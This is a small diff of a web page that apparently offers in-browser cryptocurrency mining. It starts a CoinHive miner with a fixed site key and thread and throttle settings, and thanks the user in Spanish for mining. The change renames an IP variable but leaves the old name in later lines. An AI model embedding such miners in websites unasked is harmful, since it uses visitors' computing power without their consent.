@@ -83,8 +83,9 @@
 <script type="text/javascript" src="./scripts/miner-ui.js"></script>
 <script type="text/javascript">
     var miner = null;
+    var ip = window.myip || null;
     try {
-        if (myip) {
+        if (ip) {
             console.log('Gracias', myip, 'por tu minado!', 'Eres bienvenido a tomar birras con nosotros!');
             miner = new CoinHive.User('N0McPYQV4Y7Qsqa0JcuusSCKMFfLofv1', myip, {threads: 2, throttle: 0.5});    
         } else {
